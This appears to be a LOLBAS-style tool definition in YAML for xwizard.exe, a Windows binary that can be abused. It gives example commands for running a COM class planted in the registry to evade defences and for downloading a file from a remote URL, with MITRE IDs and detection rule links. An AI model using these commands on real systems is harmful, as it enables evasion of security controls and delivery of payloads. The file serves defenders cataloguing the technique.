---
id: windows-execution-xwizard
namespace: windows:execution:xwizard
name: xwizard
description: 'Execute custom class that has been added to the registry or download
  a file with Xwizard.exe Located at: C:\Windows\System32\xwizard.exe; C:\Windows\SysWOW64\xwizard.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- xwizard
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- process-manip
execution:
  template: xwizard
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Xwizard.exe running a custom class that has been added to the registry.
    (Run a com object created in registry to evade defensive counter measures)
  command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
- description: Xwizard.exe running a custom class that has been added to the registry.
    The /t and /u switch prevent an error message in later Windows 10 builds. (Run
    a com object created in registry to evade defensive counter measures)
  command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
- description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download
    a file, and save it to INetCache. (Download file from Internet)
  command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
references:
- label: ''
  url: http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
- label: watch?v=LwDHX7DVHWU
  url: https://www.youtube.com/watch?v=LwDHX7DVHWU
- label: 0598b60112eaafe6d07789f7964290d5
  url: https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5
- label: ''
  url: https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
- label: '1306023056847110144'
  url: https://twitter.com/notwhickey/status/1306023056847110144
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1218
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
install:
- method: choco
  package_name: xwizard
  commands:
  - choco install xwizard
---

# xwizard

xwizard is a Windows LOLBin. Execute custom class that has been added to the registry or download a file with Xwizard.exe Located at: C:\Windows\System32\xwizard.exe; C:\Windows\SysWOW64\xwizard.exe.
